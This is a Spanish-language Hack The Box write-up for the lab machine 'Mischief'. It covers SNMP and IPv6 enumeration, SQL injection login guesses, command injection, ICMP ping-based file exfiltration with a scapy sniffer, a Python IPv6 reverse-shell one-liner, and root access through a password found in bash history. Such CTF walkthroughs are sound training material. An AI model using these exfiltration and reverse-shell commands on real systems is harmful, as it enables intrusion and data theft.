---
layout: single
title: Mischief - Hack The Box
excerpt: "Mischief fue uno de los cuadros de 50 puntos más fáciles, pero aun así brindó muchas oportunidades para enumerar cosas y obligó al atacante a pensar y trabajar con IPv6, que es algo que probablemente no sea algo natural para la mayoría de nosotros. Usarémmos snmp para obtener tanto la dirección IPv6 del host como las credenciales del servidor web. A partir de ahí, puedo usar esas credenciales para iniciar sesión y obtener más credenciales. Las otras credenciales funcionan en un sitio web alojado solo en IPv6. Ese sitio tiene inyección de comandos, lo que me da ejecución de código, un shell como www-data y créditos para loki. El historial de bash de loki me da la contraseña de root."

date: 2022-09-30
classes: wide
header:
  teaser: /assets/images/htb-writeup-mischief/mischief_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - cxdxnt
tags:  
  - icmp data exfiltration
  - command-injection
  - ipv6 
  - snmp
---

## Reconocimiento
Empezamos con un simple nmap.

```bash

Starting Nmap 7.70 ( https://nmap.org ) at 2022-09-29 01:10 -03
Nmap scan report for 10.10.10.92
Host is up (0.099s latency).
Not shown: 65533 filtered ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 2a:90:a6:b1:e6:33:85:07:15:b2:ee:a7:b9:46:77:52 (RSA)
|   256 d0:d7:00:7c:3b:b0:a6:32:b2:29:17:8d:69:a6:84:3f (ECDSA)
|_  256 3f:1c:77:93:5c:c0:6c:ea:26:f4:bb:6c:59:e9:7c:b0 (ED25519)
3366/tcp open  caldav  Radicale calendar and contacts server (Python BaseHTTPServer)
| http-auth:
| HTTP/1.0 401 Unauthorized\x0D
|_  Basic realm=Test
|_http-server-header: SimpleHTTP/0.6 Python/2.7.15rc1
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 67.94 seconds

```
En el puerto 3366 nos encontramos un panel login, que por ahora la contraseña desconocemos cuál es. Entonces procedemos a hacer una enumeración por puertos udp.Y notamos que el puerto 161 esta abierto.

```ruby

nmap -sU --top-port 50 --open 10.10.10.92 -v -T5 | grep -v "filtered"
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-29 01:10 -03
Initiating Ping Scan at 01:10
Scanning 10.10.10.92 [4 ports]
Completed Ping Scan at 01:10, 0.26s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 01:10
Completed Parallel DNS resolution of 1 host. at 01:10, 0.02s elapsed
Initiating UDP Scan at 01:10
Scanning 10.10.10.92 [50 ports]
Discovered open port 161/udp on 10.10.10.92
Completed UDP Scan at 01:10, 2.47s elapsed (50 total ports)
Nmap scan report for 10.10.10.92
Host is up (0.24s latency).

PORT      STATE         SERVICE
161/udp   open          snmp

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 2.90 seconds
           Raw packets sent: 126 (8.082KB) | Rcvd: 5 (610B)
```
Gracias a snmp logramos extraer la ipv6 de la máquina, que nos sirve para ver otros puertos diferentes.


```bash
snmpbulkwalk -c public -v2c 10.10.10.92  1 IP-MIB::ipAddressTable
```

![](/assets/images/htb-writeup-mischief/ipv6.png)

La arreglamos y quedaría así.

```
dead:beef:0000:0000:0250:56ff:feb9:fcc0
```
Ahora enumeramos puertos por ipv6

```bash
 nmap -6 -sCV -p22,80 dead:beef:0000:0000:0250:56ff:feb9:fcc0 -oN targetedIpv6
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-29 01:20 -03
Nmap scan report for dead:beef::250:56ff:feb9:fcc0
Host is up (0.24s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 2a:90:a6:b1:e6:33:85:07:15:b2:ee:a7:b9:46:77:52 (RSA)
|   256 d0:d7:00:7c:3b:b0:a6:32:b2:29:17:8d:69:a6:84:3f (ECDSA)
|_  256 3f:1c:77:93:5c:c0:6c:ea:26:f4:bb:6c:59:e9:7c:b0 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: 400 Bad Request
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| address-info: 
|   IPv6 EUI-64: 
|     MAC address: 
|       address: 00:50:56:b9:fc:c0
|_      manuf: VMware

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.01 seconds
```

En el puerto 80 podemos ver otro panel login.

![](/assets/images/htb-writeup-mischief/login.png)

```ruby

admin: admin
admin : password
administrator : administrator
administrator : password
admin : mischief 
administrator : mischief 
admin' and sleep(5)-- - : pass
admin' or sleep(5)-- - : pass
administrator ' and sleep(5)-- - : pass
administrator' or sleep(5)-- - : pass
```
Probamos credenciales tipicas. Y no logramos nada.Por lo que regresamos a snmmp.Extraemos informacion mas profunda de los procesos corriendo con el siguiente comando.

```bash
snmptable -v2c -Ci -c public 10.10.10.92  HOST-RESOURCES-MIB::hrSWRunTable
```
![](/assets/images/htb-writeup-mischief/proceso.png)

Dichas credenciales nos sirve para iniciar session en http://10.10.10.92:3306

![](/assets/images/htb-writeup-mischief/passwords.png)

Las credenciales que se nos representan las probamos en el panel login de ipv6 y logramos acceder.
```
administrator:trickeryanddeceit
```
![](/assets/images/htb-writeup-mischief/commands.png)

Una vez dentro nos dicen que en el directorio loki hay un credentials.txt, como no podemos leer archivos no las ingeniamos de la siguiente manera.Para poder leer archivos de la maquina vamos a usar ping,
con el parametro ```-p``` podemos mandar una cadena en hex entonces lo que hacemos es lo siguiente.


representa el archivo en hex en 4 por 4 


```bash
xxd -p -c 4 /etc/hosts
```
Luego mediante un chico script en bash, lo enviamos de apoco a poco.

```
xxd -p -c 4 /etc/hosts|while read line;do ping -c 1 -p $line 10.10.14.14;done
```

Nos creamos un script en python para extraer e pasear la información y hacerla más legible.

```python
from scapy.all import *
def data_sniff(packet):
    if packet.haslayer(ICMP):
        if packet[ICMP].type == 8:
            data =packet[ICMP].load[-4:]
            decode = str(data,'utf-8')
            print(decode,end='', flush=True)


if __name__ == '__main__':
    sniff(iface="tun0", prn=data_sniff)
```
Nos creamos otro script en python para ejecutar comandos y hacerlo todo mas comodo.

```python
from scapy.all import *
import requests

if __name__ == '__main__':
        #sniff(iface="tun0", prn=data_sniff)
        while True:
            read_file = input('cmd_>')
            data_post = {'command':read_file}
            main_url = 'http://mischief.htb/'
            cookies = {'PHPSESSID': 'nt89hn5mar8eht8jgm802iqsfd'}
            requests.post(main_url,data=data_post,cookies=cookies)

```



<video src="/assets/images/htb-writeup-mischief/read-file.mp4" controls="controls" style="max-width: 730px;">
</video>

Ahora extraemos las credenciales.

![](/assets/images/htb-writeup-mischief/leer-credenciales.png)

La escalada de privilegios me tomo bastante tiempo, pero la verdad no era nada complicado.En el bash_history de loki vemos una contraseña.Vemos si con dicha contraseña nos deja acceder a root, pero misteriosa mente nuestro usuario no tiene los privilegios para ejecutarlo.

![](/assets/images/htb-writeup-mischief/contraseña-de-root.png)

![](/assets/images/htb-writeup-mischief/permisos.png)


Mediante la inyección de comandos que tenemos procedemos a crearnos una reverse shell por ipv6


```python

python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::100c",443,0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```
Una vez como www-data probamos dicha contraseña para el usuario root.

```bash
www-data@Mischief:/var/www/html$ su root
Password: lokipasswordmischieftrickery
root@Mischief:/var/www/html# cat /root/root.txt 
The flag is not here, get a shell to find it!
root@Mischief:/var/www/html# find / -name root.txt 2>/dev/null |xargs cat 
ae155fad479c56f912c65d7be4487807
The flag is not here, get a shell to find it!
root@Mischief:/var/www/html# 
```
